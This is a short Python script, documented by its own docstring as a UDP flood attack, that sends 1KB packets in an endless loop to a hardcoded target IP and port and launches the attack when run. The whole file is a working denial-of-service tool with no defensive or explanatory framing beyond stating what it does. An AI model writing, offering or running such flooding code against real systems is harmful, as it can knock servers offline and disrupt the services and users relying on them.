'''
This Python code launches a UDP flood attack, which overwhelms a target server by sending it a continuous stream of 
UDP (User Datagram Protocol) packets. The code creates a large message (1KB of 'A's) and repeatedly sends it to the 
specified IP address and port using a UDP socket. This flooding of messages can disrupt or overload the target server, 
potentially causing it to become unresponsive.
'''

import socket

target_ip = "111.11.11.111"  # Target server IP
target_port = 9999       # Target server port

def send_udp_flood():
    message = b'A' * 1024  # 1KB message
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        s.sendto(message, (target_ip, target_port))

# Run the attack
send_udp_flood()
